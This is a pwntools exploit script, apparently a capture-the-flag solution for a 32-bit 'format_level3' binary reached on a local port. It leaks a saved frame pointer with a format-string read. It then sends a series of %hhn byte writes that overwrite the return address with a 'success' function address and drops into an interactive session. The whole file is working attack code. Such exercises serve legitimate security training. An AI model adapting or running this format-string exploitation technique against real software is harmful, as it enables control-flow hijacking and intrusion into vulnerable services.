from pwn import *

p=remote("0",36043)
#p=process("./format_level3")
context(log_level = "debug",arch = "i386",os = "linux")
p.sendlineafter("Your choice:",b'3')

p.sendlineafter("Input what you want to talk:",b'%14$x')
p.recvuntil(":")
p.recvline()
old_ebp=b'0x'+p.recvline()[:-1]
old_ebp=int(old_ebp,16)

print(hex(old_ebp))

ret=old_ebp-0xffdaaed8+0xffdaaedc
success=0x08049317
#p32(ret)+"%40c%7$hhn"   0x4a 0x30 40
#  8        40
ret_high8=ret%0x100



payload1="%"+str(ret_high8)+"c%6$hhn"
p.sendlineafter("Your choice:",b'3')
p.sendlineafter("Input what you want to talk:",payload1)

payload2="%"+str(success%0x100)+"c%14$hhn"
p.sendlineafter("Your choice:",b'3')
p.sendlineafter("Input what you want to talk:",payload2)



payload1="%"+str(ret_high8+1)+"c%6$hhn"
p.sendlineafter("Your choice:",b'3')
p.sendlineafter("Input what you want to talk:",payload1)

payload2="%"+str((success//0x100)%0x100)+"c%14$hhn"
p.sendlineafter("Your choice:",b'3')
p.sendlineafter("Input what you want to talk:",payload2)



payload1="%"+str(ret_high8+2)+"c%6$hhn"
p.sendlineafter("Your choice:",b'3')
p.sendlineafter("Input what you want to talk:",payload1)

payload2="%"+str((success//0x100//0x100)%0x100)+"c%14$hhn"
p.sendlineafter("Your choice:",b'3')
p.sendlineafter("Input what you want to talk:",payload2)



payload1="%"+str(ret_high8+3)+"c%6$hhn"
p.sendlineafter("Your choice:",b'3')
p.sendlineafter("Input what you want to talk:",payload1)

payload2="%"+str((success//0x100//0x100//0x100)%0x100)+"c%14$hhn"
p.sendlineafter("Your choice:",b'3')
#attach(p)
p.sendlineafter("Input what you want to talk:",payload2)

payload1="%"+str(ret_high8-4)+"c%6$hhn"
p.sendlineafter("Your choice:",b'3')
attach(p)
p.sendlineafter("Input what you want to talk:",payload1)



p.sendlineafter("Your choice:",b'4')

p.interactive()
